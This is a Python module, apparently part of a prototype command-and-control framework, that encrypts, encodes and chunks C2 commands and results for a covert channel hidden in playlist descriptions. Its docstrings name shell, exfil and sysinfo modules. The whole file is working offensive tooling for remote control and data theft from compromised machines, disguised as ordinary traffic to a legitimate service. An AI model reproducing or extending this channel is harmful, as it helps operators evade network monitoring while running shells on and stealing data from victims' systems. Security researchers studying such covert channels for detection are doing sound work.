"""c2_protocol.py - C2 message serialization, encoding, and chunking.

Adapts the existing Subcipher encryption pipeline for in-memory
JSON messages. Handles command and result encoding, chunking for
playlist descriptions, and reassembly.

Message flow:
    dict -> JSON -> compress -> BLAKE2b -> AES-GCM -> Base64 -> chunks
"""

import base64
import json
import time

from encoding import Subcipher, compute_blake2b
from spotapi import CHUNK_SIZE

__author__ = '@sourcefrenchy'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'

# Channel discriminators embedded in playlist metadata
CHANNEL_CMD = "cmd"
CHANNEL_RES = "res"

# Metadata overhead: MARKER_SEP + {"c":"cmd","i":999,"seq":999} ~ 35 chars
C2_META_OVERHEAD = 40
C2_EFFECTIVE_CHUNK = CHUNK_SIZE - C2_META_OVERHEAD


class C2Message:
    """Represents a C2 command or result message.

    Commands have: module, seq, args
    Results have: module, seq, status, data
    """

    def __init__(self, module: str, seq: int,
                 args: dict = None, status: str = None,
                 data: str = None):
        """Initialize a C2 message.

        Args:
            module: Module name (shell, exfil, sysinfo).
            seq: Sequence number for ordering and matching.
            args: Command arguments (commands only).
            status: Execution status 'ok' or 'error' (results only).
            data: Result data string (results only).
        """
        self.module = module
        self.seq = seq
        self.args = args or {}
        self.status = status
        self.data = data
        self.ts = time.time()

    def to_command_dict(self) -> dict:
        """Serialize as a command dict for transmission."""
        return {
            "module": self.module,
            "args": self.args,
            "seq": self.seq,
            "ts": self.ts,
        }

    def to_result_dict(self) -> dict:
        """Serialize as a result dict for transmission."""
        return {
            "seq": self.seq,
            "module": self.module,
            "status": self.status,
            "data": self.data,
            "ts": self.ts,
        }

    @classmethod
    def from_command_dict(cls, d: dict) -> 'C2Message':
        """Deserialize a command dict."""
        msg = cls(
            module=d["module"],
            seq=d["seq"],
            args=d.get("args", {}),
        )
        msg.ts = d.get("ts", time.time())
        return msg

    @classmethod
    def from_result_dict(cls, d: dict) -> 'C2Message':
        """Deserialize a result dict."""
        msg = cls(
            module=d["module"],
            seq=d["seq"],
            status=d.get("status"),
            data=d.get("data"),
        )
        msg.ts = d.get("ts", time.time())
        return msg


def encode_message(message_dict: dict, encryption_key: str) -> str:
    """Encode a message dict into an encrypted Base64 string.

    Pipeline: JSON -> UTF-8 -> compress -> BLAKE2b -> AES-GCM -> Base64

    Args:
        message_dict: Command or result dict to encode.
        encryption_key: AES-256-GCM passphrase.

    Returns:
        Base64-encoded encrypted string.
    """
    cipher = Subcipher(spot=None, encryption_key=encryption_key)
    plaintext = json.dumps(message_dict).encode('utf-8')
    checksum = compute_blake2b(plaintext)
    data = cipher._compress(plaintext)
    hash_bytes = checksum.encode('utf-8')
    hash_len = len(hash_bytes).to_bytes(2, 'big')
    data_to_encrypt = hash_len + hash_bytes + data
    encrypted = cipher._encrypt(data_to_encrypt)
    return base64.b64encode(encrypted).decode('utf-8')


def decode_message(b64_payload: str, encryption_key: str) -> dict:
    """Decode an encrypted Base64 string back to a message dict.

    Reverses encode_message. Verifies BLAKE2b integrity.

    Args:
        b64_payload: Base64-encoded encrypted string.
        encryption_key: AES-256-GCM passphrase (must match).

    Returns:
        Decoded message dict.

    Raises:
        ValueError: If integrity check fails or decryption fails.
    """
    cipher = Subcipher(spot=None, encryption_key=encryption_key)
    raw = base64.b64decode(b64_payload)
    decrypted = cipher._decrypt(raw)
    hash_len = int.from_bytes(decrypted[:2], 'big')
    stored_hash = decrypted[2:2 + hash_len].decode('utf-8')
    compressed = decrypted[2 + hash_len:]
    plaintext = cipher._decompress(compressed)
    actual_hash = compute_blake2b(plaintext)
    if stored_hash != actual_hash:
        raise ValueError("C2 message integrity check failed")
    return json.loads(plaintext.decode('utf-8'))


def chunk_payload(b64_payload: str, seq: int,
                  channel: str) -> list:
    """Split encoded payload into playlist-sized chunks with metadata.

    Each chunk + MARKER_SEP + metadata fits within CHUNK_SIZE.

    Args:
        b64_payload: Base64-encoded encrypted payload.
        seq: Sequence number for this message.
        channel: Channel discriminator (CHANNEL_CMD or CHANNEL_RES).

    Returns:
        List of (chunk_data, metadata_json_str) tuples.
    """
    chunks = []
    if len(b64_payload) <= C2_EFFECTIVE_CHUNK:
        meta = json.dumps(
            {"c": channel, "i": 1, "seq": seq},
            separators=(',', ':'),
        )
        chunks.append((b64_payload, meta))
    else:
        parts = [
            b64_payload[i:i + C2_EFFECTIVE_CHUNK]
            for i in range(0, len(b64_payload), C2_EFFECTIVE_CHUNK)
        ]
        for idx, part in enumerate(parts, start=1):
            meta = json.dumps(
                {"c": channel, "i": idx, "seq": seq},
                separators=(',', ':'),
            )
            chunks.append((part, meta))
    return chunks


def reassemble_payload(chunk_metas: list) -> str:
    """Reassemble chunks sorted by index into a single Base64 payload.

    Args:
        chunk_metas: List of (chunk_data, metadata_dict) tuples.

    Returns:
        Concatenated Base64 payload string.
    """
    sorted_chunks = sorted(chunk_metas, key=lambda x: x[1].get('i', 0))
    return ''.join(c[0] for c in sorted_chunks)
